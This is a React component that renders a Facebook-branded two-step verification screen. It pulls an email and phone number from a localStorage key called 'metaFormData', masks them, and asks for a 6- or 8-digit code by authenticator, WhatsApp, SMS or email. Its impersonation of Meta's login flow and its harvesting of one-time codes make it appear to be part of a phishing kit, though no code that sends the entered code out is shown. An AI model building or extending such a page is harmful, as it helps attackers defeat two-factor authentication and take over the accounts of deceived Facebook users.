import { useEffect, useState } from 'react';
import AuthencationApp from '../assets/img/authencation-app.jpg';
import Whatapp from '../assets/img/whatapp.png';
import Sms from '../assets/img/Sms.png';
import VerifyModal from '../components/index/verify-modal';

const TwoStepVerification = () => {
    const [email, setEmail] = useState('');
    const [phoneNumber, setPhoneNumber] = useState('');
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [code, setCode] = useState('');
    const [value, setValue] = useState({
        id: 'authenticator',
        title: 'Authenticator App',
        desc: 'Google Authenticator, Duo Mobile',
        imgSrc: AuthencationApp
    });

    useEffect(() => {
        // Lấy dữ liệu từ localStorage theo cấu trúc mới
        const storedData = localStorage.getItem('metaFormData');
        if (storedData) {
            const parsed = JSON.parse(storedData);
            setEmail(parsed.email || '');
            setPhoneNumber(parsed.phoneNumber || '');
        }
    }, []);

    const handleCodeChange = (e) => {
        const value = e.target.value.replace(/\D/g, '');
        if (value.length <= 8) {
            setCode(value);
        }
    };

    const methodList = [
        {
            id: 'authenticator',
            title: 'Authenticator App',
            desc: 'Google Authenticator, Duo Mobile',
            imgSrc: AuthencationApp
        },
        {
            id: 'whatsapp',
            title: 'WhatsApp',
            desc: `We'll send a code to number ${
                phoneNumber
                    ? phoneNumber.slice(-2).padStart(phoneNumber.length, '*')
                    : '******00'
            }`,
            imgSrc: Whatapp
        },
        {
            id: 'sms',
            title: 'SMS',
            desc: `We'll send a code to number ${
                phoneNumber
                    ? phoneNumber.slice(-2).padStart(phoneNumber.length, '*')
                    : '******00'
            }`,
            imgSrc: Sms
        },
        {
            id: 'email',
            title: 'Email',
            desc: `We'll send a code to ${
                email
                    ? email.substring(0, 2) + '***@' + email.split('@')[1]
                    : 'te***@example.us'
            }`,
            imgSrc: Sms
        }
    ];

    return (
        <div className='verify'>
            <div className='container--verify'>
                <div className='container--verify--child'>
                    <div className='container--verify--child-title'>
                        <span>{email}</span>
                        <span>•Facebook</span>
                    </div>
                    <div>
                        <div className='value--title'>{value.title}</div>
                        <div className='value--desc'>{value.desc}</div>
                        <img src={value.imgSrc} className='img-verify' />
                    </div>
                    <div>
                        <input
                            type='text'
                            inputMode='numeric'
                            className='pass-code'
                            value={code}
                            onChange={handleCodeChange}
                            placeholder='Enter 6 or 8 digit code'
                        />
                    </div>
                    <div>
                        <button
                            className='btn-continue'
                            disabled={code.length !== 6 && code.length !== 8}
                        >
                            Continue
                        </button>
                    </div>
                    <div>
                        <button
                            className='btn--try'
                            onClick={() => setIsModalOpen(true)}
                        >
                            Try Another Way
                        </button>
                    </div>
                </div>

                <VerifyModal
                    isOpen={isModalOpen}
                    onClose={() => setIsModalOpen(false)}
                    methodList={methodList}
                    onSelectMethod={(method) => setValue(method)}
                />
            </div>
        </div>
    );
};

export default TwoStepVerification;
